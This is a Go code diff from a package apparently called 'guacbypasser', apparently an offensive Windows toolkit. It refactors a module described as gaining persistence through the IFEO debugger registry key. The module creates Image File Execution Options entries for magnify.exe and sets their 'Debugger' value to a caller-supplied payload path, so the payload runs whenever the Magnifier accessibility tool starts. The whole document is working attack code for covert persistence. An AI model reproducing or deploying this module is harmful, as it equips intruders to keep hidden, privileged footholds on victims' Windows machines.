@@ -1,21 +1,20 @@
 package guacbypasser
 
 import (
-	"log"
 	"path/filepath"
 	"runtime"
 
 	"golang.org/x/sys/windows/registry"
 )
 
-func pIfeo(path string) error {
-	_ = Reporter{
+func w32_nt_persistence_ifeo(p string) (error, Informer) {
+	inf := Informer{
 		Name: "ifeo",
 		Desc: "Gain persistence using IFEO debugger registry key",
 		Id:   6,
 
 		Type:   "Persistence",
-		Module: "pIfeo",
+		Module: "w32_nt_persistence_ifeo",
 
 		Fixed:   false,
 		FixedIn: "",
@@ -24,23 +23,23 @@ func pIfeo(path string) error {
 		Payload: true,
 	}
 
-	fullPath, err := filepath.Abs(path)
+	fPath, err := filepath.Abs(p)
 	if err != nil {
-		return err
+		return err, inf
 	}
 
 	if _, _, err = registry.CreateKey(
 		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
 		registry.SET_VALUE|registry.ALL_ACCESS); err != nil {
 
-		return err
+		return err, inf
 	}
 	if runtime.GOARCH == "386" {
 		if _, _, err = registry.CreateKey(
 			registry.CURRENT_USER, `Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
 			registry.SET_VALUE|registry.ALL_ACCESS); err != nil {
 
-			return err
+			return err, inf
 		}
 
 		wk32, err := registry.OpenKey(
@@ -49,10 +48,10 @@ func pIfeo(path string) error {
 		)
 		defer wk32.Close()
 		if err != nil {
-			return err
+			return err, inf
 		}
 		if err := wk32.SetStringValue("Configuration", "magnifierpane"); err != nil {
-			return err
+			return err, inf
 		}
 
 		wk32, err = registry.OpenKey(
@@ -61,17 +60,17 @@ func pIfeo(path string) error {
 		)
 		wk32.Close()
 		if err != nil {
-			return err
+			return err, inf
 		}
-		if err := wk32.SetStringValue("Debugger", fullPath); err != nil {
-			return err
+		if err := wk32.SetStringValue("Debugger", fPath); err != nil {
+			return err, inf
 		}
 	} else {
 		if _, _, err = registry.CreateKey(
 			registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
 			registry.SET_VALUE|registry.ALL_ACCESS); err != nil {
 
-			return err
+			return err, inf
 		}
 		wk32, err := registry.OpenKey(
 			registry.CURRENT_USER, `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`,
@@ -79,10 +78,10 @@ func pIfeo(path string) error {
 		)
 		defer wk32.Close()
 		if err != nil {
-			return err
+			return err, inf
 		}
 		if err := wk32.SetStringValue("Configuration", "magnifierpane"); err != nil {
-			return err
+			return err, inf
 		}
 
 		wk32, err = registry.OpenKey(
@@ -91,12 +90,15 @@ func pIfeo(path string) error {
 		)
 		wk32.Close()
 		if err != nil {
-			log.Println(err)
+			return err, inf
 		}
-		if err := wk32.SetStringValue("Debugger", fullPath); err != nil {
-			log.Println(err)
+		if err := wk32.SetStringValue("Debugger", fPath); err != nil {
+			return err, inf
 		}
 	}
 
-	return nil
+	return nil, inf
 }
+
+// NewPersistenceIFEO #add-some-info-please
+func NewPersistenceIFEO(p string) (error, Informer) { return w32_nt_persistence_ifeo(p) }
